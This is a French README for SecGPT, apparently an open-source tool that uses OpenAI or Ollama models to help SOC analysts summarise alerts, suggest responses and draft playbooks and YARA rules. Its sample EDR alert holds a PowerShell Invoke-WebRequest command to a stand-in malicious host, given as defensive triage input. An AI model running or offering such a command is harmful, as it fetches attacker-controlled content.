
![image](https://github.com/user-attachments/assets/92577af6-2cac-47dc-9957-19f04de0d789)


# ğŸ§  SecGPT â€“ Assistant IA pour analystes SOC

<p align="center">
  <img src="https://img.shields.io/badge/Python-3.8+-blue.svg?style=for-the-badge&logo=python&logoColor=white" alt="Python 3.8+"/>
  <img src="https://img.shields.io/badge/LLM-OpenAI_&_Ollama-green.svg?style=for-the-badge&logo=openai&logoColor=white" alt="LLM"/>
  <img src="https://img.shields.io/badge/License-MIT-green.svg?style=for-the-badge" alt="License: MIT"/>
</p>

<p align="center">
  <b>Assistant IA conÃ§u pour les analystes de sÃ©curitÃ© SOC</b><br>
  <sub>ğŸ” RÃ©sumÃ© d'alertes | ğŸ›¡ï¸ RÃ©ponse aux incidents | ğŸ“‹ Playbooks | ğŸ§¬ RÃ¨gles YARA</sub>
</p>

---

## ğŸ“‹ Description

**SecGPT** est un assistant IA pour les analystes SOC qui permet d'automatiser l'analyse initiale des alertes de sÃ©curitÃ©. Il peut rapidement rÃ©sumer des alertes complexes, suggÃ©rer des rÃ©ponses appropriÃ©es, gÃ©nÃ©rer des playbooks et mÃªme proposer des rÃ¨gles YARA pour la dÃ©tection.

> âš ï¸ **Note importante** : Cet outil est conÃ§u pour assister les analystes de sÃ©curitÃ©, non pour les remplacer. Les recommandations gÃ©nÃ©rÃ©es doivent Ãªtre examinÃ©es par un professionnel avant d'Ãªtre appliquÃ©es.

### ğŸ” FonctionnalitÃ©s principales

- ğŸ“„ **RÃ©sume des alertes** issues de diffÃ©rentes sources (EDR, mail de phishing, logs, etc.)
- ğŸ”§ **Suggestion de rÃ©ponses** adaptÃ©es au contexte de l'alerte
- âš™ï¸ **GÃ©nÃ©ration de playbooks SOC** pour standardiser les procÃ©dures de rÃ©ponse
- ğŸ§¬ **CrÃ©ation de rÃ¨gles YARA** de base pour la dÃ©tection de menaces similaires
- ğŸ§  **Support de diffÃ©rents LLM** : GPT-4 (API OpenAI) ou modÃ¨les locaux via Ollama

## âš™ï¸ Installation

```bash
# Cloner le dÃ©pÃ´t
git clone https://github.com/servais1983/SecGPT.git
cd SecGPT

# Installer les dÃ©pendances
pip install -r requirements.txt

# Configurer les variables d'environnement
cp .env.example .env
# Ã‰diter .env avec votre clÃ© API OpenAI ou configurez pour utiliser Ollama localement
```

## ğŸ› ï¸ Utilisation

### Interface en ligne de commande

```bash
# Analyse d'une alerte Ã  partir d'un fichier texte
python secgpt.py --input examples/alert.txt
```

### Interface web (Gradio)

```bash
# Lancer l'interface web
python ui/webapp.py
```

L'interface web sera accessible Ã  l'adresse http://localhost:7860 par dÃ©faut.

## ğŸ’¡ Exemples d'analyse

### Alerte JSON d'EDR

```json
{"timestamp":"2024-05-12T15:44:01Z","user":"jdoe","command":"powershell Invoke-WebRequest http://malicious.com","process":"powershell.exe"}
```

### RÃ©sultats gÃ©nÃ©rÃ©s

- **RÃ©sumÃ©** : Analyse concise de l'alerte en langage clair
- **RÃ©ponse recommandÃ©e** : Actions Ã  entreprendre immÃ©diatement
- **Playbook** : ProcÃ©dure Ã©tape par Ã©tape pour traiter l'incident
- **RÃ¨gle YARA** : DÃ©tection de patterns similaires Ã  l'avenir

## ğŸ—‚ï¸ Structure du projet

```
secgpt/
â”œâ”€â”€ app/              # Logique principale
â”‚   â”œâ”€â”€ core.py       # Coordination des analyses IA
â”‚   â”œâ”€â”€ models.py     # Connecteurs LLM (OpenAI, Ollama)
â”‚   â””â”€â”€ templates.py  # Prompts de base pour les LLM
â”œâ”€â”€ ui/               # Interfaces utilisateur
â”‚   â””â”€â”€ webapp.py     # Interface web Gradio
â”œâ”€â”€ examples/         # Exemples d'alertes pour tests
â”‚   â””â”€â”€ alert.txt     # Exemple d'alerte JSON
â”œâ”€â”€ secgpt.py         # Interface CLI
â”œâ”€â”€ requirements.txt  # DÃ©pendances Python
â”œâ”€â”€ .env.example      # Configuration (clÃ©s API, etc.)
â””â”€â”€ README.md         # Documentation
```

## ğŸ”„ Modes LLM supportÃ©s

Le projet supporte deux modes d'utilisation des LLM :

1. **OpenAI (GPT-4)** - Performances optimales mais nÃ©cessite une clÃ© API et un coÃ»t d'utilisation
   - Configuration : `LLM_MODE=openai` dans .env
   - NÃ©cessite : `OPENAI_API_KEY=sk-your-key-here`

2. **Ollama (local)** - Fonctionne entiÃ¨rement en local, sans coÃ»t, mais performances rÃ©duites
   - Configuration : `LLM_MODE=ollama` dans .env (dÃ©faut)
   - NÃ©cessite : [Ollama](https://ollama.ai/) installÃ© localement avec au moins un modÃ¨le (llama2 par dÃ©faut)

## ğŸ“ˆ FonctionnalitÃ©s Ã  venir

- [ ] Support pour d'autres modÃ¨les LLM (Claude, Gemini, etc.)
- [ ] Enrichissement contextuel des alertes (IOCs, rÃ©putation, etc.)
- [ ] IntÃ©gration MITRE ATT&CK pour classification des menaces
- [ ] GÃ©nÃ©ration de rapports dÃ©taillÃ©s en format PDF
- [ ] API REST pour intÃ©gration Ã  d'autres systÃ¨mes SOC
- [ ] Historisation et comparaison des alertes similaires

## ğŸ¤ Contribuer

Les contributions sont les bienvenues ! N'hÃ©sitez pas Ã  ouvrir une issue ou Ã  soumettre une pull request.

## ğŸ“„ Licence

Ce projet est sous licence MIT - voir le fichier LICENSE pour plus de dÃ©tails.

---

<p align="center">
  <sub>ğŸ” DÃ©veloppÃ© pour aider les analystes SOC Ã  traiter les alertes plus efficacement</sub>
</p>
